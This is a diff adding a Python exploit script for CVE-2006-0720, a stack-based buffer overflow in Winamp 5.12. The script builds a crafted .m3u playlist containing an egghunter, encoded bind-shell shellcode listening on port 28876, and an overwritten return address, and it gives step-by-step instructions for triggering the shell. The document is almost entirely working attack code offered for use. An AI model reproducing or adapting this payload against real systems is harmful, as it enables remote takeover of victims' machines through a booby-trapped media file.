@@ -1,0 +1,83 @@
+# Exploit Title: Winamp 5.12 .m3u stack based buffer overflow
+# Date: 16 June 2013
+# Exploit Author: superkojiman - http://www.techorganic.com
+# Vendor Homepage: http://www.winamp.com/
+# Software Link: http://www.oldapps.com/winamp.php?old_winamp=211
+# Version: 5.12
+# Tested on: Windows XP Professional SP2, English
+# CVE: CVE-2006-0720
+# BID: 16785
+#
+# Description from CVE-2006-0720
+# Stack-based buffer overflow in Nullsoft Winamp 5.12 and 5.13 
+# allows user-assisted attackers to cause a denial of service 
+# (crash) and possibly execute arbitrary code via a crafted 
+# .m3u file that causes an incorrect strncpy function call 
+# when the player pauses or stops the file.
+#
+#
+# 1. Launch Winamp
+# 2. Drag boom.m3u into Winamp window 
+# 3. Check for bind shell on port 28876
+#
+
+import struct
+
+header =  "#EXTM3U\n"
+header += "#EXTINF:1234,Pwnage Rock\n"
+
+# NTDisplayString
+egghunter = (
+"\x90" * 64 +
+"\x66\x81\xca\xff\x0f\x42\x52\x6a\x43\x58" +
+"\xcd\x2e\x3c\x05\x5a\x74\xef\xb8" +
+"\x77\x30\x30\x74" + # w00t
+"\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7" +
+"\x90" * 30
+)
+
+junk = "\x41" * 262 + "\x90" * 100 + egghunter
+
+# bind shell on port 28876
+# https://code.google.com/p/w32-bind-ngs-shellcode/
+# msfencode -i w32-bind-ngs-shellcode.bin -b "\x00\x0a\x0d\x5c"
+# [*] x86/shikata_ga_nai succeeded with size 241 (iteration=1)
+shellcode = (
+"w00tw00t" + "\x90" * 239 + 
+"\xbf\x26\x63\xb2\x20\xda\xcc\xd9\x74\x24\xf4\x5a\x33\xc9" +
+"\xb1\x36\x83\xea\xfc\x31\x7a\x10\x03\x7a\x10\xc4\x96\x83" +
+"\xe9\x6c\xd2\x95\xd9\xe7\x92\x59\x91\x81\x46\xe9\xcb\x65" +
+"\xfc\x93\x33\xfe\x34\x54\x7b\x18\x4c\x57\xd2\x70\x9c\xc8" +
+"\xe6\xb2\x88\x90\x5e\xc5\x3b\x35\xe8\xa6\xb5\x5d\x9f\x5e" +
+"\x70\x5e\x89\x52\x52\xad\x40\x8d\x73\xde\xf9\x10\x2d\x60" +
+"\xaf\xc5\x9c\xe1\xa0\xc5\xba\xa9\xb5\x48\xff\xbe\x96\x6f" +
+"\x87\xc1\xcd\x04\x3c\xe2\x10\xf3\x95\xd3\xc0\x41\x91\x20" +
+"\x74\x44\x4b\xfc\x40\xea\xa7\x8c\x84\x36\xfb\x1f\xa0\x41" +
+"\x3e\xc7\x3f\x46\x61\x8c\x8b\xbc\x9f\x7b\x04\x0b\x8b\x2a" +
+"\x90\x38\xa8\xcd\x4f\x37\x38\xce\x8b\xd6\x12\x51\xad\xd1" +
+"\x11\x5a\x5f\xbf\xdd\x09\xa0\xef\x89\x38\xde\x31\x45\x36" +
+"\x6e\x13\x04\x47\x40\x06\xa9\x68\xf4\xd9\x79\x77\x08\x56" +
+"\xb6\xed\xe7\x3f\x14\xa4\xf8\x6f\xe3\x87\x73\x77\xdd\xd5" +
+"\x2e\xef\x7d\xb7\xaa\xcf\x0c\x3b\x17\x37\xa4\x6f\xfc\x81" +
+"\xfd\x86\x02\x59\x85\x65\x21\x36\xdb\xc7\x7b\x7e\x9c\x08" +
+"\x73\x29\x71\x85\xd3\x87\x8a\x7f\x38\xac\x33\x7c\x29\x78" +
+"\x44\x83\x55"
+)
+
+# 022B368C , call ecx , C:\Progam Files\Winamp\pxsdkpls.dll
+ret = struct.pack("<I", 0x022B368C)
+
+# for some reason eip doesn't get overwritten and Winamp 
+# crashes differently unless the 4th byte after ret is
+# a 0xB0. there's probably an easier way to do this but 
+# this is what the fuzzer found first so...
+wtf = "\x43\x43\x43\xB0"
+
+f = open("boom.m3u", "w")
+f.write(header + junk + shellcode + ret + wtf)
+f.close()
+
+print "Created boom.m3u"
+print "1. Open Winamp"
+print "2. Drag boom.m3u into Winamp window"
+print "3. Check for bind shell on port 28876"
